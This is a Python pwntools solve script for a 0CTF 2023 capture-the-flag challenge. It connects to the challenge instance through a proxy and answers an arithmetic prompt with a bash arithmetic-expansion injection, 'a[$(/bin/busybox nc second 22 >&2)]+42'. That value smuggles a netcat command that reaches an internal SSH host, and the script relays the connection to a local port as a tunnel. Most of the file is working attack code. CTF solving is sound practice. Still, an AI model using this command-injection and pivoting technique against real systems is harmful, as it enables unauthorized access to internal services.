#!/usr/bin/env python3
from socketserver import BaseRequestHandler, TCPServer
from pwn import *
import threading


class MyTCPHandler(BaseRequestHandler):
    def handle(self):
        with process(
                [
                    "nc",
                    "-X",
                    "connect",
                    "-x",
                    "instance.0ctf2023.ctf.0ops.sjtu.cn:18081",
                    "wx9vbvvmrw43ekc2",
                    "1",
                ]
        ) as tube:
            tube.sendlineafter(
                b"Now, write down the exam integrity statement here:\n",
                b"I promise to play fairly and not to cheat. In case of violation, I voluntarily accept punishment",
            )
            tube.sendlineafter(b"1 + 1 = ?\n", b"a[$(/bin/busybox nc second 22 >&2)]+42")

            def forward1():
                while True:
                    buf = tube.recv(4096)
                    if len(buf) == 0:
                        break
                    self.request.send(buf)

            def forward2():
                while True:
                    buf = self.request.recv(4096)
                    if len(buf) == 0:
                        break
                    tube.send(buf)

            threading.Thread(target=forward1).start()
            forward2()


class MyTCPServer(TCPServer):
    allow_reuse_address = True


def main():
    with MyTCPServer(('127.0.0.1', 2222), MyTCPHandler) as server:
        server.serve_forever()


if __name__ == "__main__":
    main()
